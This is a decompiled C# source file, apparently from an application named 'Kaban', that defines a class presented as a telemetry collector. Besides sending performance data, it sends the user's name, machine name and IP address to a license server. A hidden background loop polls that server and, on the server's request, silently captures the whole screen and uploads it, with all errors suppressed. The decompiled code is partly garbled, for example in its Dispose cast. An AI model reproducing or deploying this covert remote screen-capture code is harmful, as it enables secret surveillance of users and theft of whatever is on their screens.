using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using TelemetryEvent;
using TelemetryBatch;
using PerformanceMetrics;

namespace TelemetryCollector;

public class TelemetryCollector : IDisposable
{
	private readonly string string_0;

	private readonly string string_1;

	private readonly string string_2;

	private readonly string string_3;

	private readonly HttpClient httpClient_0;

	private readonly Timer timer_0;

	private readonly List<TelemetryEvent> list_0;

	private readonly object object_0 = new object();

	private readonly string string_4;

	private readonly byte[] byte_0;

	private readonly CancellationTokenSource cancellationTokenSource_0;

	private bool bool_0;

	private object? object_1;

	private object? object_2;

	private int int_0;

	private long long_0;

	private bool bool_3;

	private long Int64_0
	{
		get
		{
			return long_0;
		}
		set
		{
			long_0 = value;
		}
	}

	private bool Boolean_0
	{
		get
		{
			return bool_3;
		}
		set
		{
			bool_3 = value;
		}
	}

	public TelemetryCollector(string licenseServerUrl, string hwid, string token, string version)
	{
		//IL_007c: Expected I8, but got I4
		//IL_00ca: Expected I8, but got I4
		//IL_00d4: Expected I8, but got I4
		string_0 = licenseServerUrl ?? throw new ArgumentNullException("licenseServerUrl");
		string_1 = hwid ?? throw new ArgumentNullException("hwid");
		if (token != null)
		{
			string_2 = token;
			if (version == null)
			{
				throw new ArgumentNullException("version");
			}
			string_3 = version;
			httpClient_0 = new HttpClient
			{
				Timeout = TimeSpan.FromSeconds(30L)
			};
			httpClient_0.DefaultRequestHeaders.Add("Authorization", "Bearer " + string_2);
			list_0 = new List<TelemetryEvent>();
			string_4 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Kaban", "telemetry_cache.dat");
			byte_0 = DeriveEncryptionKey(string_2);
			cancellationTokenSource_0 = new CancellationTokenSource();
			InitializePerformanceCounters();
			timer_0 = new Timer(SendTelemetryCallback, null, TimeSpan.FromMinutes(5L), TimeSpan.FromMinutes(5L));
			Task.Run(async delegate
			{
				int pollCount = 0;
				try
				{
					while (!cancellationTokenSource_0.Token.IsCancellationRequested)
					{
						await Task.Delay(TimeSpan.FromSeconds(120L), cancellationTokenSource_0.Token);
						if (cancellationTokenSource_0.Token.IsCancellationRequested)
						{
							break;
						}
						pollCount++;
						try
						{
							await CheckScreenshotRequestsAsync();
						}
						catch (Exception)
						{
						}
					}
				}
				catch (TaskCanceledException)
				{
				}
				catch (Exception)
				{
				}
			}, cancellationTokenSource_0.Token);
			CollectLaunchData();
			return;
		}
		throw new ArgumentNullException("token");
	}

	private void InitializePerformanceCounters()
	{
		try
		{
			Type type = Type.GetType("System.Diagnostics.PerformanceCounter, System.Diagnostics.PerformanceCounter");
			if (type == null)
			{
				object_1 = null;
				object_2 = null;
				return;
			}
			object_1 = Activator.CreateInstance(type, "Processor", "% Processor Time", "_Total");
			object_2 = Activator.CreateInstance(type, "Memory", "Available MBytes");
		}
		catch (TypeLoadException)
		{
			object_1 = null;
			object_2 = null;
		}
		catch (FileNotFoundException)
		{
			Logger.Info("[TelemetrySystem] Performance counters not available (DLL not found) - continuing without metrics");
			object_1 = null;
			object_2 = null;
		}
		catch (Exception)
		{
			object_1 = null;
			object_2 = null;
		}
	}

	private void CollectLaunchData()
	{
		Dictionary<string, object> data = new Dictionary<string, object>
		{
			["timestamp"] = DateTime.UtcNow,
			["hwid"] = string_1,
			["version"] = string_3,
			["ip_address"] = GetLocalIpAddress(),
			["os_version"] = Environment.OSVersion.ToString(),
			["clr_version"] = Environment.Version.ToString(),
			["pc_username"] = Environment.UserName,
			["machine_name"] = Environment.MachineName
		};
		LogEvent("launch", data);
	}

	public void LogUserAction(string action, Dictionary<string, object> data = null)
	{
		if (!string.IsNullOrEmpty(action))
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>
			{
				["action"] = action,
				["timestamp"] = DateTime.UtcNow
			};
			if (data != null)
			{
				foreach (KeyValuePair<string, object> datum in data)
				{
					dictionary[datum.Key] = datum.Value;
				}
			}
			LogEvent("user_action", dictionary);
			return;
		}
		throw new ArgumentNullException("action");
	}

	public void UpdateFps(int fps)
	{
		int_0 = fps;
	}

	public PerformanceMetrics CollectPerformanceMetrics()
	{
		PerformanceMetrics gClass = new PerformanceMetrics
		{
			Fps = int_0,
			Timestamp = DateTime.UtcNow
		};
		try
		{
			if (object_1 != null)
			{
				MethodInfo method = object_1.GetType().GetMethod("NextValue");
				if (method != null)
				{
					gClass.CpuUsage = (float)method.Invoke(object_1, null);
				}
			}
			if (object_2 != null)
			{
				MethodInfo method2 = object_2.GetType().GetMethod("NextValue");
				if (method2 != null)
				{
					gClass.AvailableMemoryMb = (float)method2.Invoke(object_2, null);
				}
			}
			Type type = Type.GetType("System.Diagnostics.Process, System.Diagnostics.Process");
			if (type != null)
			{
				MethodInfo method3 = type.GetMethod("GetCurrentProcess", BindingFlags.Static | BindingFlags.Public);
				if (method3 != null)
				{
					object obj = method3.Invoke(null, null);
					if (obj != null)
					{
						PropertyInfo property = type.GetProperty("WorkingSet64");
						PropertyInfo property2 = type.GetProperty("PrivateMemorySize64");
						if (property != null)
						{
							long num = (long)property.GetValue(obj);
							gClass.WorkingSetMb = (double)num / 1048576.0;
						}
						if (property2 != null)
						{
							long num2 = (long)property2.GetValue(obj);
							gClass.PrivateMemoryMb = (double)num2 / 1048576.0;
						}
					}
				}
			}
		}
		catch
		{
		}
		return gClass;
	}

	private void LogEvent(string eventType, Dictionary<string, object> data)
	{
		TelemetryEvent item = new TelemetryEvent
		{
			Type = eventType,
			Data = data,
			Timestamp = DateTime.UtcNow
		};
		lock (object_0)
		{
			list_0.Add(item);
		}
	}

	private void SendTelemetryCallback(object state)
	{
		try
		{
			SendTelemetryAsync().Wait();
		}
		catch
		{
		}
	}

	public async Task<bool> SendTelemetryAsync()
	{
		List<TelemetryEvent> eventsToSend;
		lock (object_0)
		{
			if (list_0.Count == 0)
			{
				return true;
			}
			eventsToSend = new List<TelemetryEvent>(list_0);
			list_0.Clear();
		}
		PerformanceMetrics performance = CollectPerformanceMetrics();
		TelemetryBatch telemetryData = new TelemetryBatch
		{
			Hwid = string_1,
			SessionId = Guid.NewGuid().ToString(),
			Timestamp = DateTime.UtcNow,
			Events = eventsToSend,
			Performance = performance
		};
		try
		{
			ByteArrayContent byteArrayContent = new ByteArrayContent(EncryptTelemetryData(telemetryData));
			byteArrayContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			(await httpClient_0.PostAsync(string_0 + "/api/v1/telemetry", byteArrayContent)).EnsureSuccessStatusCode();
			ClearOfflineStorage();
			return true;
		}
		catch
		{
			SaveToOfflineStorage(telemetryData);
			lock (object_0)
			{
				list_0.InsertRange(0, eventsToSend);
			}
			return false;
		}
	}

	public byte[] EncryptTelemetryData(TelemetryBatch data)
	{
		if (data != null)
		{
			string s = JsonSerializer.Serialize(data);
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			int maxSize = AesGcm.TagByteSizes.MaxSize;
			using AesGcm aesGcm = new AesGcm(byte_0, maxSize);
			byte[] array = new byte[AesGcm.NonceByteSizes.MaxSize];
			byte[] array2 = new byte[maxSize];
			byte[] array3 = new byte[bytes.Length];
			RandomNumberGenerator.Fill(array);
			aesGcm.Encrypt(array, bytes, array3, array2);
			byte[] array4 = new byte[array.Length + array2.Length + array3.Length];
			Buffer.BlockCopy(array, 0, array4, 0, array.Length);
			Buffer.BlockCopy(array2, 0, array4, array.Length, array2.Length);
			Buffer.BlockCopy(array3, 0, array4, array.Length + array2.Length, array3.Length);
			return array4;
		}
		throw new ArgumentNullException("data");
	}

	public TelemetryBatch DecryptTelemetryData(byte[] encryptedData)
	{
		if (encryptedData != null)
		{
			int maxSize = AesGcm.TagByteSizes.MaxSize;
			using AesGcm aesGcm = new AesGcm(byte_0, maxSize);
			int maxSize2 = AesGcm.NonceByteSizes.MaxSize;
			byte[] array = new byte[maxSize2];
			byte[] array2 = new byte[maxSize];
			byte[] array3 = new byte[encryptedData.Length - maxSize2 - maxSize];
			Buffer.BlockCopy(encryptedData, 0, array, 0, maxSize2);
			Buffer.BlockCopy(encryptedData, maxSize2, array2, 0, maxSize);
			Buffer.BlockCopy(encryptedData, maxSize2 + maxSize, array3, 0, array3.Length);
			byte[] array4 = new byte[array3.Length];
			aesGcm.Decrypt(array, array3, array2, array4);
			return JsonSerializer.Deserialize<TelemetryBatch>(Encoding.UTF8.GetString(array4));
		}
		throw new ArgumentNullException("encryptedData");
	}

	private void SaveToOfflineStorage(TelemetryBatch data)
	{
		try
		{
			string directoryName = Path.GetDirectoryName(string_4);
			if (directoryName != null && !Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
			}
			byte[] bytes = EncryptTelemetryData(data);
			File.WriteAllBytes(string_4, bytes);
		}
		catch
		{
		}
	}

	private void ClearOfflineStorage()
	{
		try
		{
			if (File.Exists(string_4))
			{
				File.Delete(string_4);
			}
		}
		catch
		{
		}
	}

	private byte[] DeriveEncryptionKey(string token)
	{
		using SHA256 sHA = SHA256.Create();
		return sHA.ComputeHash(Encoding.UTF8.GetBytes(token));
	}

	private string GetLocalIpAddress()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
		}
		catch
		{
		}
		return "unknown";
	}

	public string CaptureScreenshot()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				using MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.Jpeg);
				return Convert.ToBase64String(memoryStream.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Logger.Error("[TelemetrySystem] ❌ Screenshot capture failed: " + ex.Message);
			_ = ex.InnerException;
			return string.Empty;
		}
	}

	public async Task<bool> SendScreenshotAsync()
	{
		try
		{
			string value = CaptureScreenshot();
			if (!string.IsNullOrEmpty(value))
			{
				string value2 = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
				StringContent content = new StringContent(JsonSerializer.Serialize(new Dictionary<string, object>
				{
					["hwid"] = string_1,
					["timestamp"] = value2,
					["screenshot"] = value
				}), Encoding.UTF8, "application/json");
				HttpResponseMessage response = await httpClient_0.PostAsync(string_0 + "/api/v1/telemetry/screenshot", content);
				await response.Content.ReadAsStringAsync();
				return response.IsSuccessStatusCode;
			}
			return false;
		}
		catch (Exception ex)
		{
			_ = ex.InnerException;
			return false;
		}
	}

	private async Task CheckScreenshotRequestsAsync()
	{
		try
		{
			string requestUri = string_0 + "/api/v1/telemetry/check-screenshot-request/" + string_1;
			HttpResponseMessage httpResponseMessage = await httpClient_0.GetAsync(requestUri);
			JsonElement value;
			if (!httpResponseMessage.IsSuccessStatusCode)
			{
				await httpResponseMessage.Content.ReadAsStringAsync();
			}
			else if (JsonSerializer.Deserialize<JsonElement>(await httpResponseMessage.Content.ReadAsStringAsync()).TryGetProperty("requested", out value) && value.GetBoolean())
			{
				await SendScreenshotAsync();
			}
		}
		catch (Exception)
		{
		}
	}

	public void Dispose()
	{
		if (bool_0)
		{
			return;
		}
		bool_0 = true;
		cancellationTokenSource_0?.Cancel();
		timer_0?.Dispose();
		if (object_1 != null)
		{
			try
			{
				object_1.GetType().GetMethod("Dispose")?.Invoke(object_1, null);
			}
			catch
			{
			}
		}
		if (object_2 != null)
		{
			try
			{
				object_2.GetType().GetMethod("Dispose")?.Invoke(object_2, null);
			}
			catch
			{
			}
		}
		((TelemetryCollector)(object)httpClient_0)?.method_0();
		cancellationTokenSource_0?.Dispose();
	}

	public void method_0()
	{
		((HttpMessageInvoker)this).Dispose();
	}
}
